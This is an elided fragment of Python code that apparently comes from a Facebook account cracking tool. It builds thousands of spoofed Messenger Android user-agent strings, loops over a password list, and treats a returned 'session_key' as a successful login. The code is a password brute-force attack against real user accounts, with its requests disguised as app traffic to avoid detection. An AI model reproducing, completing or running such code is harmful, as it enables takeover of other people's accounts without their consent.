...
for x in range(10000):
    ua_string="Dalvik/2.1.0 (Linux; U; Android 2.3.0; vivo 1935 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/312.0.0.8.106;FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/431836095;FBCR/AXIS;FBMF/vivo;FBBD/vivo;FBDV/vivo 1935;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.29375,width=1080,height=2145};]"
    se=f'{ua_string}'
    ugen.append(se)
...
#zwelay="[FBAN/Orca-Android;FBAV/"+str(random.choice(range(100,300)))+".0.0.16."+str(random.choice(range(100,300)))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"
    ...
    try:
        for ps in pwx:
            ...
            if 'session_key' in lo:
                ...
                #print(f'\033[1;90mUSER-AGENT : \033[1;90m'+pro)
